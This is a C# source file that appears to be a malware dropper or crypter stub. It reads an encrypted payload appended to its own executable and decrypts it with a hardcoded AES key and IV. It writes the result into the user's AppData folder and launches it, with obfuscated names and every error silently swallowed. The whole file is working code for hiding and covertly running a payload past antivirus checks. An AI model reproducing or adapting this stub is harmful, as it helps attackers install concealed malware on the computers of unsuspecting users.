using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Element;

internal class Element
{
	private static byte[] ProgramC;

	private static string[] bestandsnaam;

	private static string binnentekst;

	private static string applicatiedatamap;

	private static string[] spleef = new string[1] { "[jMNWHJWw6cnLv87oEkqldf]" };

	private static void Main(string[] args)
	{
		try
		{
			binnentekst = Rally();
			applicatiedatamap = haalmap();
			bestandsnaam = binnesplitje();
			ProgramC = Cerrus(Convert.FromBase64String(bestandsnaam[1]));
			BioWr();
			DiaProStart();
		}
		catch
		{
		}
	}

	private static bool DiaProStart()
	{
		try
		{
			Process.Start(applicatiedatamap + "\\" + bestandsnaam[2]);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static bool BioWr()
	{
		try
		{
			File.WriteAllBytes(applicatiedatamap + "\\" + bestandsnaam[2], ProgramC);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static string[] binnesplitje()
	{
		try
		{
			return binnentekst.Split(spleef, StringSplitOptions.None);
		}
		catch
		{
			return new string[2] { "x", "y" };
		}
	}

	private static string Rally()
	{
		try
		{
			return File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch
		{
			return "";
		}
	}

	private static byte[] Cerrus(byte[] RdlmKey)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] iV = new byte[16]
			{
				1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
				2, 3, 4, 5, 6, 7
			};
			byte[] key = new byte[16]
			{
				7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
				6, 5, 4, 3, 2, 1
			};
			rijndaelManaged.IV = iV;
			rijndaelManaged.Key = key;
			return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RdlmKey, 0, RdlmKey.Length);
		}
		catch
		{
			return null;
		}
	}

	private static string haalmap()
	{
		try
		{
			return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}
		catch
		{
			return "";
		}
	}
}
